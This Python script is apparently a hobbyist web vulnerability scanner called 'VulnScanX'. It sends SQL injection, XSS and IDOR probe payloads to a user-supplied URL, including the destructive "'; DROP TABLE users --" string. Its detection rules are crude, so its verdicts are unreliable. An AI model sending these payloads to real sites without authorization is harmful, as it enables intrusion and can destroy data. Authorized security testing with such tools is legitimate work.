import os
import requests
from datetime import datetime
from colorama import Fore, Style
import platform

# Banner
def display_banner():
    print(Fore.GREEN + """
               _                                
  __   ___   _| |_ __  ___  ___ __ _ _ __ __  __
  \ \ / / | | | | '_ \/ __|/ __/ _` | '_ \\ \/ /
   \ V /| |_| | | | | \__ \ (_| (_| | | | |>  < 
    \_/  \__,_|_|_| |_|___/\___\__,_|_| |_/_/\_\
	
     Created by "Technical Corp"
     visit our YouTube channel: https://youtube.com/@technicalcorp
     """)
    print(Style.RESET_ALL)
    print(Fore.YELLOW + "    VulnScanX - OWASP Top 10 Scanner\n" + Style.RESET_ALL)
    print(Fore.CYAN + "    Created for ethical hacking and cybersecurity professionals\n" + Style.RESET_ALL)

# Advanced Payloads
SQL_PAYLOADS = [
    "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "admin' --", "' OR 1=1#", "'; DROP TABLE users --"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "<IMG SRC=javascript:alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')"
]

IDOR_PAYLOADS = [
    "/user/1", "/admin", "/account/123", "/order/456", "/profile/1/settings"
]

SENSITIVE_DATA_INDICATORS = ["password", "secret", "api_key", "token", "confidential"]

# Vulnerability Scanning Functions
def check_sql_injection(url):
    for payload in SQL_PAYLOADS:
        target = f"{url}?q={payload}"
        try:
            response = requests.get(target, timeout=5)
            if "SQL" in response.text or "syntax" in response.text or "database" in response.text:
                return (True, payload)
        except requests.exceptions.RequestException:
            continue
    return (False, None)

def check_xss(url):
    for payload in XSS_PAYLOADS:
        target = f"{url}?q={payload}"
        try:
            response = requests.get(target, timeout=5)
            if payload in response.text:
                return (True, payload)
        except requests.exceptions.RequestException:
            continue
    return (False, None)

def check_sensitive_data_exposure(url):
    try:
        response = requests.get(url, timeout=5)
        for keyword in SENSITIVE_DATA_INDICATORS:
            if keyword in response.text.lower():
                return (True, keyword)
    except requests.exceptions.RequestException:
        return (False, None)
    return (False, None)

def check_idor(url):
    for endpoint in IDOR_PAYLOADS:
        target = f"{url}{endpoint}"
        try:
            response = requests.get(target, timeout=5)
            if response.status_code == 200 and "user" in response.url:
                return (True, endpoint)
        except requests.exceptions.RequestException:
            continue
    return (False, None)

def check_security_misconfig(url):
    try:
        response = requests.get(url, timeout=5)
        headers = response.headers
        if "Server" in headers or "X-Powered-By" in headers:
            return (True, headers)
    except requests.exceptions.RequestException:
        return (False, None)
    return (False, None)

# Main Scanning Logic
def scan_website(url):
    results = {}
    print(Fore.BLUE + "\nScanning for vulnerabilities...\n" + Style.RESET_ALL)
    results['SQL Injection'] = check_sql_injection(url)
    results['Cross-Site Scripting (XSS)'] = check_xss(url)
    results['Sensitive Data Exposure'] = check_sensitive_data_exposure(url)
    results['Insecure Direct Object References (IDOR)'] = check_idor(url)
    results['Security Misconfiguration'] = check_security_misconfig(url)
    return results

# Save Results to File
def save_results(url, results):
    filename = f"scan_results_{datetime.now().strftime('%Y%m%d%H%M%S')}.txt"
    with open(filename, 'w') as file:
        file.write(f"Scan results for {url}\n")
        file.write("=" * 50 + "\n")
        for vuln, (status, detail) in results.items():
            if status:
                file.write(f"{vuln}: Vulnerable\n")
                file.write(f"  - Detail: {detail}\n")
            else:
                file.write(f"{vuln}: Not Vulnerable\n")
    print(Fore.GREEN + f"\nResults saved to {filename}" + Style.RESET_ALL)

# Main Menu
def main():
    while True:
        # Clear the screen based on the operating system
        if platform.system() == "Windows":
            os.system("cls")
        else:
            os.system("clear")
        
        display_banner()
        print(Fore.YELLOW + "\nWelcome to VulnScanX - OWASP Top 10 Scanner\n" + Style.RESET_ALL)
        url = input(Fore.CYAN + "Enter the target website URL (e.g., http://example.com): " + Style.RESET_ALL).strip()
        if not url.startswith("http"):
            print(Fore.RED + "Invalid URL format. Please include http:// or https://" + Style.RESET_ALL)
            continue
        
        results = scan_website(url)
        print(Fore.YELLOW + "\nScan Results:" + Style.RESET_ALL)
        for vuln, (status, detail) in results.items():
            print(f"{vuln}: {'Vulnerable' if status else 'Not Vulnerable'}")
            if status:
                print(Fore.CYAN + f"  - Why: Detected using payload/detail: {detail}" + Style.RESET_ALL)

        save_results(url, results)

        # Ask user if they want to scan more or exit
        choice = input(Fore.YELLOW + "\nDo you want to scan another website? (yes/no): " + Style.RESET_ALL).strip().lower()
        if choice != "yes":
            print(Fore.GREEN + "\nThank you for using VulnScanX. Goodbye!" + Style.RESET_ALL)
            break

# Entry Point
if __name__ == "__main__":
    main()
